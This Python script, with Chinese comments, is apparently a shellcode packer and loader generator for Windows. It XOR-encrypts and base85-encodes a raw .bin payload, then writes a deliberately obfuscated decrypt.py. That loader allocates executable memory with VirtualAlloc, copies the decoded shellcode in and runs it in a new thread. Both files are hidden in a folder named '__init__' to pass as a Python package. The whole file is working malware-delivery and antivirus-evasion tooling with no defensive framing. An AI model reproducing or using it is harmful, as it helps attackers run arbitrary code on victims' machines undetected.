import base64
import os
import glob
import time
import shutil

def xor_encrypt_decrypt(data, key):
    return bytes([b ^ key for b in data])

bin_files = glob.glob('*.bin')
if not bin_files:
    raise FileNotFoundError("没有找到 .bin 文件")
input_file = bin_files[0]

with open(input_file, 'rb') as f:
    file_data = f.read()

timestamp = int(time.time())
xor_key = timestamp % 256  # 使密钥在 0-255 范围内

encrypted_data = xor_encrypt_decrypt(file_data, xor_key)

encoded_data = base64.b85encode(encrypted_data).decode('ascii')

with open('python.dat', 'w') as f:
    f.write(encoded_data)

decrypt_script = f"""
import base64 #line:1
import ctypes #line:2
import sys #line:3
def xor_encrypt_decrypt (O000OO0O00O0O0000 ,OO000O0000OOO00OO ):#line:6
    return bytes ([O0OO00OOOO0O00OO0 ^OO000O0000OOO00OO for O0OO00OOOO0O00OO0 in O000OO0O00O0O0000 ])#line:7
with open ('__init__/python.dat','r')as f :#line:10
    encoded_data =f .read ()#line:11
decoded_data =base64 .b85decode (encoded_data )#line:14
timestamp ={timestamp}#line:17
xor_key =timestamp %256 #line:18
decrypted_data =xor_encrypt_decrypt (decoded_data ,xor_key )#line:21
shellcode =bytearray (decrypted_data )#line:24
ctypes .windll .kernel32 .VirtualAlloc .restype =ctypes .c_uint64 #line:27
ptr =ctypes .windll .kernel32 .VirtualAlloc (ctypes .c_int (0 ),ctypes .c_int (len (shellcode )),ctypes .c_int (0x3000 |0x2000 ),ctypes .c_int (0x40 ))#line:35
buf =(ctypes .c_char *len (shellcode )).from_buffer (shellcode )#line:41
ctypes .windll .kernel32 .RtlMoveMemory (ctypes .c_uint64 (ptr ),buf ,ctypes .c_int (len (shellcode )))#line:46
handle =ctypes .windll .kernel32 .CreateThread (ctypes .c_int (0 ),ctypes .c_int (0 ),ctypes .c_uint64 (ptr ),ctypes .c_int (0 ),ctypes .c_int (0 ),ctypes .pointer (ctypes .c_int (0 )))#line:56
ctypes .windll .kernel32 .WaitForSingleObject (ctypes .c_int (handle ),ctypes .c_int (-1 ))
"""

with open('decrypt.py', 'w', encoding='utf-8') as f:
    f.write(decrypt_script)

print(f"[encrypt success, xor_key = {xor_key}, encrypted_data is python.dat] ")

init_dir = '__init__'
os.makedirs(init_dir, exist_ok=True)

shutil.move('python.dat', os.path.join(init_dir, 'python.dat'))
shutil.move('decrypt.py', os.path.join(init_dir, 'decrypt.py'))

print(f"[encrypted_data & decrypt.py moved to {init_dir}] ")